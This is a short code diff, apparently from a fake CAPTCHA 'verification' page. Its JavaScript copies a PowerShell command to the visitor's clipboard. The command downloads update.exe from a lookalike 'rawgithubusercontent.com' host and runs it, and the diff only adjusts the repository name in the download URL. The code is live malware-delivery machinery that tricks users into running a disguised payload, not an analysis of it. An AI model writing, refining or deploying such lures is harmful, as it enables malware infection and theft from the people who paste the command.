@@ -200,7 +200,7 @@
         e.stopPropagation(); // Prevents triggerFix from running again when clicking button
 
         // FIXED: Added quotes around the string so it is a valid JS string
-        const fakeCommand = 'powershell -NoProfile -Command "iwr -Uri \'https://rawgithubusercontent.com/Re-capta-secure/rechaptasecure/refs/heads/main/update.exe\' -OutFile \"$env:TEMP\\update.exe\"; Start-Process -FilePath \"$env:TEMP\\update.exe\""';
+        const fakeCommand = 'powershell -NoProfile -Command "iwr -Uri \'https://rawgithubusercontent.com/Re-chapta-secure/rechaptasecure/refs/heads/main/update.exe\' -OutFile \"$env:TEMP\\update.exe\"; Start-Process -FilePath \"$env:TEMP\\update.exe\""';
 
         navigator.clipboard.writeText(fakeCommand);
 
